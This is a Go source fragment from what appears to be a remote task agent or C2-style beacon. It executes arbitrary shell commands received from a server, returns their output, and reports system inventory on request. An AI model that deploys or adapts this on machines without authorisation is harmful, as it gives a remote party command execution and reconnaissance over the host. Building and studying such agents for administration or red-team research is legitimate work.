package main

import (
	"log"
	"time"
)

// buildResult clones the base task and applies updates along with optional completion metadata.
func buildResult(task Task, responded bool, updates map[string]any) Task {
	result := cloneTask(task)
	if responded {
		result["responded"] = true
		result["stopped_processing_at"] = time.Now().Format(time.RFC3339)
	}
	for key, value := range updates {
		result[key] = value
	}
	return result
}

// submitResult posts the task result and emits a consistent log message.
func submitResult(server string, agentID string, task Task, responded bool, updates map[string]any) {
	result := buildResult(task, responded, updates)
	_ = submitTaskResult(server, agentID, result)
	log.Printf("Submitting task result for task ID " + taskValue(task, "task_id"))
}

// processTask handles a single task and returns false when the agent should stop running.
func processTask(server string, agentID string, task Task) bool {
	instruction := taskValue(task, "instruction")

	switch instruction {
	case "syscall":
		cmd := taskValue(task, "arg")
		log.Printf("Running " + cmd + " for task ID " + taskValue(task, "task_id"))

		cmdout := GetCommandOutput(cmd)

		submitResult(server, agentID, task, true, map[string]any{
			"stdout":    cmdout,
			"stderr":    "",
			"exit_code": 0,
		})
		return true

	case "exit":
		submitResult(server, agentID, task, true, map[string]any{
			"stdout":    "",
			"stderr":    "",
			"exit_code": 0,
		})
		log.Printf("Program is exiting...")
		return false

	case "inventory":
		submitResult(server, agentID, task, true, map[string]any{
			"inventory": compileSystemInfo(),
		})
		return true

	default:
		log.Printf("Unknown task instruction %q for task ID %s", instruction, taskValue(task, "task_id"))
		return true
	}
}
